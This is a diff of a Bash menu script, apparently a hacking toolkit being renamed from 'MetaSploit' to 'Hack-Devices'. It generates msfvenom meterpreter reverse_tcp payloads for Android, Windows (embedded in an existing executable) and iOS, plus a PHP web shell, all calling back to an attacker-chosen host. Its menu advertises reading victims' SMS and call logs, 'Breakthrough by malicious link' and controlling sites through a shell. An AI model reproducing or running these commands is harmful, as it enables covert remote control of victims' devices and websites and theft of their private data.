@@ -13,7 +13,7 @@ reset='\033[0m'
 y='\033[1;33m'
 n=install
 echo -e "$green "
-figlet  -f big "           MetaSploit  "
+figlet  -f big "           Hacking "
 echo -e "$blue"
 echo -e
 #--------------------------------------------------
@@ -26,25 +26,25 @@ clear
 echo -e "Welcom In"
 sleep 0.4
 clear
-echo -e "Welcom In MetaSploit" 
+echo -e "Welcom In Hacking" 
 sleep 0.4
 clear
-echo -e "Welcome In MetaSploit 2019"
+echo -e "Welcome In Hacking 2019"
 sleep 0.4
 clear
-echo -e "Welcome In MetaSploit 2019 U"
+echo -e "Welcome In Hacking 2019 U"
 sleep 0.4
 clear
-echo -e "Welcome In MetaSploit 2019 U Can"
+echo -e "Welcome In Hacking 2019 U Can"
 sleep 0.4
 clear
-echo -e "Welcome In MetaSploit 2019 U Can Injoy"
+echo -e "Welcome In Hacking 2019 U Can Injoy"
 sleep 0.4
 clear
-echo -e "Welcome In MetaSploit 2019 U Can Injoy With"
+echo -e "Welcome In Hacking 2019 U Can Injoy With"
 sleep 0.4
 clear
-echo -e "Welcome In MetaSploit 2019 U Can Injoy With Me"
+echo -e "Welcome In Hacking 2019 U Can Injoy With Me"
 echo ""
 echo -e $p     "Copy"
 sleep 0.4
@@ -83,26 +83,26 @@ sleep 1
 #echo ''
 echo -e "$red                  [77] update          exit [00]"
 echo -e "$cyan"
-echo "            [1]payload android ????????"
-echo "            [2]payload windows ????????"
-echo "            [3]Android penetration msf ????????"
-echo "            [4]windows penetration msf ????????"
-echo "            [5]Breakthrough via Port (21)????"
-echo "            [6]Breakthrough via Port (445)????"
-echo "            [7]open (sms,calllog,....txt) The victim ????????   "
-echo "            [8]Open the victim files that you downloaded ???? "
-echo "            [9]Breakthrough by malicious link ???"
-echo "            [10]error metasploit ??????             "
-echo "            [11]Download msf (5.0.0)??????"
-echo "            [12]payload iphone ???????"
-echo "            [13]iphone penetration msf ????????"
-echo "            [14]Create SHELL ?????"
-echo "            [15]Control the site by shell ????"
-echo "            [16]Search Engine Domain Email Address Collector????"
-echo "            [17]DNS Record Scanner and Enumerator???"
-echo "            [18]TCP Port Scanner???????"
-echo "            [19]TCP SYN Port Scanner ?????"
-echo "            [20]HTTP Version Detection????"
+echo "            [1]payload android "
+echo "            [2]payload windows "
+echo "            [3]Android penetration msf "
+echo "            [4]windows penetration msf "
+echo "            [5]Breakthrough via Port (21)"
+echo "            [6]Breakthrough via Port (445)"
+echo "            [7]open (sms,calllog,....txt) The victim "
+echo "            [8]Open the victim files that you downloaded"
+echo "            [9]Breakthrough by malicious link "
+echo "            [10]error metasploit "
+echo "            [11]Download msf (5.0.0)"
+echo "            [12]payload iphone "
+echo "            [13]iphone penetration msf "
+echo "            [14]Create SHELL "
+echo "            [15]Control the site by shell "
+echo "            [16]Search Engine Domain Email Address Collector"
+echo "            [17]DNS Record Scanner and Enumerator"
+echo "            [18]TCP Port Scanner"
+echo "            [19]TCP SYN Port Scanner "
+echo "            [20]HTTP Version Detection"
 echo -e "$green"
 read -p "     number------->  " Zoal
 #--------------------------------------------------
@@ -119,9 +119,12 @@ read -p "                       Name----->" name
 echo -e $yellow " please insert path :>"
 read -p "                       Path----->" path
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.apk
+echo ""
 echo -e $cyan " Done  Now U Can find a Payload in your files"
-sleep 3
-bash metasploit.sh
+echo ""
+read -p "Press Enter Key to continue..."
+readEnterKey
+bash hacking.sh
 fi
 if [ $Zoal -eq 2 ]
 then
@@ -134,9 +137,10 @@ read -p "                      Name----->" name
 echo -e $green " please insert path :>"
 read -p "                      Path----->" path
 msfvenom -a x86 --platform windows -x $name.exe -k -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.exe
+echo ""
 echo -e $cyan " Done  Now U Can find a Payload in your files"
-sleep 3
-bash metasploit.sh
+read -p "Press Enter to continue..."
+bash hacking.sh
 fi
 if [ $Zoal -eq 3 ]
 then
@@ -172,7 +176,7 @@ cd $HOME/ && ls
 echo ""
 read -p "name.txt ------> " n
 fi
-cd $HOME/MetaSploit
+cd $HOME/Hack-Devices
 if [ $Zoal -eq 8 ]
 then
 echo -e "$red"
@@ -182,7 +186,7 @@ echo ""
 read -p "name photo ------> " n
 echo -e "$green"
 fi
-cd $HOME/MetaSploit
+cd $HOME/Hack-Devices
 if [ $Zoal -eq 10 ]
 then
 echo -e "++++++++++++++++> please wait <++++++++++++++++"
@@ -202,7 +206,7 @@ cd metasploit-framework
 bundle update nokogiri
 echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
 sleep 1
-metasploit.sh
+hacking.sh
 fi
 if [ $Zoal -eq 12 ]
 then
@@ -214,10 +218,11 @@ echo -e $green " please insert Name payload :>"
 read -p "                      Name----->" name
 echo -e $green " please insert path :>"
 read -p "                      Path----->" path
-msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.ipa
+echo ""
 echo -e $cyan " Done Now u can find a payload in your files"
-sleep 3
-bash metasploit.sh
+read -p "Press Enter to continue..."
+bash hacking.sh
 fi
 if [ $Zoal -eq 9 ]
 then
@@ -242,9 +247,10 @@ read -p "                    LHOST----->" host
 echo -e $blue "Please Insert PORT :>"
 read -p "                    LPORT----->" lport
 msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php
+echo ""
 echo -e $blue " Done u can find a shell in your files"
-sleep 3
-bash metasploit.sh
+read -p "Press Enter to continue..."
+bash hacking.sh
 fi
 if [ $Zoal -eq 15 ]
 then
@@ -287,8 +293,8 @@ fi
 if [ $Zoal -eq 77 ]
 then
 cd $HOME
-rm -rf MetaSploit
-git clone https://github.com/saeedo201/MetaSploit
+rm -rf Hack-Devices
+git clone https://github.com/saeedo201/Hack-Devices
 echo -e $cayn #---------->Hi New Update<----------#
 sleep 2
 cd $HOME
